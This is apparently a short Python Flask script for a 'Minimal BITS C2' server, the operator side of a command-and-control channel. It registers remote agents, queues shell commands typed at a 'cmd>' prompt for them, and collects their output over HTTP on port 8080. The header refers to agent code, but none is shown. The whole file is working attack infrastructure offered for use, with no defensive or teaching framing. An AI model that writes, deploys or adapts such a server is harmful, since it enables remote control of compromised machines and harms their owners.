# Minimal BITS C2 - Simpler version
# Server: python3 minimal_c2.py
# Agent: See agent code below

from flask import Flask, request, jsonify
import datetime

app = Flask(__name__)
commands = {}
results = {}

@app.route('/register')
def register():
    agent_id = request.args.get('id', 'agent')
    print(f"[+] Agent connected: {agent_id}")
    return jsonify({"status": "ok"})

@app.route('/cmd/<agent_id>')
def get_cmd(agent_id):
    cmd = commands.pop(agent_id, "")
    return jsonify({"command": cmd})

@app.route('/result/<agent_id>', methods=['POST'])
def post_result(agent_id):
    result = request.get_json().get('result', '')
    results[agent_id] = result
    print(f"\n[{agent_id}] OUTPUT:\n{result}\n")
    return jsonify({"status": "ok"})

if __name__ == "__main__":
    import threading
    
    def cli():
        while True:
            try:
                cmd = input("cmd> ")
                if cmd:
                    commands['agent'] = cmd
            except:
                pass
    
    threading.Thread(target=cli, daemon=True).start()
    print("[*] Minimal C2 Server")
    print("[*] Starting on http://0.0.0.0:8080")
    app.run(host='0.0.0.0', port=8080, debug=False)
